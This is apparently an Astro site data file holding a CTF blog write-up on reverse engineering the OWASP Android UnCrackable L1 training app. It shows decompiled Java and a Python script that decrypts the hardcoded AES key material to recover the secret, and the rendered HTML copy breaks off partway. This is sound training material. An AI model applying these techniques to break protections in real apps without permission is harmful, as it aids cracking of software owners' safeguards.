[["Map",1,2,7,8],"meta::meta",["Map",3,4,5,6],"astro-version","4.15.12","config-digest","2e5958a2216fa0f5","blog",["Map",9,10,44,45,74,75,98,99,136,137,155,156,197,198,224,225,261,262],"android-reversing-suite",{"id":9,"data":11,"body":18,"filePath":19,"digest":20,"rendered":21},{"author":12,"pubDatetime":13,"title":14,"tags":15,"description":17},"Sat Naing",["Date","2024-09-23T15:22:00.000Z"],"android reversing suite (UPDATE ABANDONED)",[16],"off-season","Some basic challenges based on android reversing. Will update as I solve more challenges","\n# Background Information\n\nWelcome to one of my \"suites\"! These suites are me practicing some skills for CTFs or just fooling around. This suite is focused on android reverse engineering. I'll be using OWASP android app samples, picoctf challenges, some hextree.io (maybe) and a google beginner's quest CTF challenge.\n\n## OWASP\n#### Android UnCrackable L1 \n\nTo start, let's look at basic functionality. \n\nThis app is pretty simple. It prompts for a \"secret string\" and you provide it, then it checks whether it is correct or not.\n\nLet's load up JADX (JAVA Decompiler) and analyze the source code to see under the hood of this application.\n\nUpon some searching we find some source code that looks like our app\n\n```java\npublic class MainActivity extends Activity {\n    private void a(String str) {\n        AlertDialog create = new AlertDialog.Builder(this).create();\n        create.setTitle(str);\n        create.setMessage(\"This is unacceptable. The app is now going to exit.\");\n        create.setButton(-3, \"OK\", new DialogInterface.OnClickListener() { // from class: sg.vantagepoint.uncrackable1.MainActivity.1\n            @Override // android.content.DialogInterface.OnClickListener\n            public void onClick(DialogInterface dialogInterface, int i) {\n                System.exit(0);\n            }\n        });\n        create.setCancelable(false);\n        create.show();\n    }\n\n    @Override // android.app.Activity\n    protected void onCreate(Bundle bundle) {\n        if (c.a() || c.b() || c.c()) {\n            a(\"Root detected!\");\n        }\n        if (b.a(getApplicationContext())) {\n            a(\"App is debuggable!\");\n        }\n        super.onCreate(bundle);\n        setContentView(R.layout.activity_main);\n    }\n\n    public void verify(View view) {\n        String str;\n        String obj = ((EditText) findViewById(R.id.edit_text)).getText().toString();\n        AlertDialog create = new AlertDialog.Builder(this).create();\n        if (a.a(obj)) {\n            create.setTitle(\"Success!\");\n            str = \"This is the correct secret.\";\n        } else {\n            create.setTitle(\"Nope...\");\n            str = \"That's not it. Try again.\";\n        }\n        create.setMessage(str);\n        create.setButton(-3, \"OK\", new DialogInterface.OnClickListener() { // from class: sg.vantagepoint.uncrackable1.MainActivity.2\n            @Override // android.content.DialogInterface.OnClickListener\n            public void onClick(DialogInterface dialogInterface, int i) {\n                dialogInterface.dismiss();\n            }\n        });\n        create.show();\n    }\n}\n```\n\nSo what we can analyze is that this is the basic functionality of the android application. It sets up all the frontend and actions in the application. Let's try to see how we can get into the `\"Success!\"` path.\n\n```java\nString obj = ((EditText) findViewById(R.id.edit_text)).getText().toString();\n\nif (a.a(obj)) {\n            create.setTitle(\"Success!\");\n            str = \"This is the correct secret.\";\n}\n```\n\nIt seems that an `a` object and `a` method is called with the parameter that is our input. Let's try to find this `a` object.\n\n```java\npublic class a {\n    public static boolean a(String str) {\n        byte[] bArr;\n        byte[] bArr2 = new byte[0];\n        try {\n            bArr = sg.vantagepoint.a.a.a(b(\"8d127684cbc37c17616d806cf50473cc\"), Base64.decode(\"5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=\", 0));\n        } catch (Exception e) {\n            Log.d(\"CodeCheck\", \"AES error:\" + e.getMessage());\n            bArr = bArr2;\n        }\n        return str.equals(new String(bArr));\n    }\n\n    public static byte[] b(String str) {\n        int length = str.length();\n        byte[] bArr = new byte[length / 2];\n        for (int i = 0; i \u003C length; i += 2) {\n            bArr[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) \u003C\u003C 4) + Character.digit(str.charAt(i + 1), 16));\n        }\n        return bArr;\n    }\n}\n```\n```java\npublic class a {\n    public static byte[] a(byte[] bArr, byte[] bArr2) {\n        SecretKeySpec secretKeySpec = new SecretKeySpec(bArr, \"AES/ECB/PKCS7Padding\");\n        Cipher cipher = Cipher.getInstance(\"AES\");\n        cipher.init(2, secretKeySpec);\n        return cipher.doFinal(bArr2);\n    }\n}\n```\nWow. Lot to unpack here. But the gist of this is that the program will try to decrypt this hardcoded ciphertext with a hardcoded key which we know because of the AES error. We can also deduce that the AES used is ECB due to the other a object in a different file found.\n\nLet's write a solve script that will decrypt the ciphertext with the hardcoded key we found.\n\n```python\nfrom Crypto.Cipher import AES\nimport base64\nimport binascii\n\nciphertext_base64 = \"5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=\"  \nkey_hex = \"8d127684cbc37c17616d806cf50473cc\" \n\nkey_hash = binascii.unhexlify(key_hex)\n\nciphertext_bytes = base64.b64decode(ciphertext_base64)\n\n\ncipher = AES.new(key_hash, AES.MODE_ECB)\n\ndecrypted = cipher.decrypt(ciphertext_bytes)\n\nprint(decrypted.decode('utf-8'))\n```\n\nWe get our password: `I want to believe`. We can check this by emulating the android application.\n\n![Image of exploit success](/img/writeups/2024/android-suite/OWASP_level1.png)\n\n## picoCTF\n\n#### droids 3\n\n","src/content/blog/android-reversing-suite.md","94ca5b2f1f9b8a0e",{"html":22,"metadata":23},"\u003Ch1 id=\"background-information\">Background Information\u003C/h1>\n\u003Cp>Welcome to one of my “suites”! These suites are me practicing some skills for CTFs or just fooling around. This suite is focused on android reverse engineering. I’ll be using OWASP android app samples, picoctf challenges, some hextree.io (maybe) and a google beginner’s quest CTF challenge.\u003C/p>\n\u003Ch2 id=\"owasp\">OWASP\u003C/h2>\n\u003Ch4 id=\"android-uncrackable-l1\">Android UnCrackable L1\u003C/h4>\n\u003Cp>To start, let’s look at basic functionality.\u003C/p>\n\u003Cp>This app is pretty simple. It prompts for a “secret string” and you provide it, then it checks whether it is correct or not.\u003C/p>\n\u003Cp>Let’s load up JADX (JAVA Decompiler) and analyze the source code to see under the hood of this application.\u003C/p>\n\u003Cp>Upon some searching we find some source code that looks like our app\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"java\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">public\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> class\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#FFCB8B\"> MainActivity\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> extends\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\"> Activity\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    private\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> void\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> a\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">String\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D7DBE0\"> str\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">        AlertDialog\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> create\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> new\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> AlertDialog\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Builder\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#7FDBCA\">this\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">create\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">        create\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">setTitle\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">str\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">        create\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">setMessage\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">This is unacceptable. The app is now going to exit.\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">        create\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">setButton\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">-\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">3\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">OK\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> new\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> DialogInterface\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">OnClickListener\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> { \u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">//\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> from class: sg.vantagepoint.uncrackable1.MainActivity.1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            @\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">Override\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\"> //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> android.content.DialogInterface.OnClickListener\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            public\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> void\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> onClick\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">DialogInterface\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> dialogInterface\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> int\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> i\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">                System\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">exit\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">0\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">            }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        }\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">        create\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">setCancelable\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">false\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">        create\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">show\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    @\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">Override\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\"> //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> android.app.Activity\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    protected\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> void\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> onCreate\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">Bundle\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D7DBE0\"> bundle\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">a\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> ||\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">b\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> ||\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">c\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">            a\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Root detected!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">b\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">a\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">getApplicationContext\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">            a\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">App is debuggable!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#7FDBCA\">        super\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">onCreate\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">bundle\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">        setContentView\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">R\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#FAF39F;--shiki-dark-font-style:italic\">layout\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#FAF39F;--shiki-dark-font-style:italic\">activity_main\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    public\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> void\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> verify\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">View\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D7DBE0\"> view\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">        String\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> str\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">        String\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> obj\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> ((EditText) \u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">findViewById\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">R\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#FAF39F;--shiki-dark-font-style:italic\">id\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">.\u003C/span>\u003Cspan style=\"color:#1976D2;font-style:inherit;--shiki-dark:#FAF39F;--shiki-dark-font-style:italic\">edit_text\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">getText\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">toString\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">        AlertDialog\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> create\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\"> new\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> AlertDialog\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Builder\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#7FDBCA\">this\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">)\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">create\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D9F5DD\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">a\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan 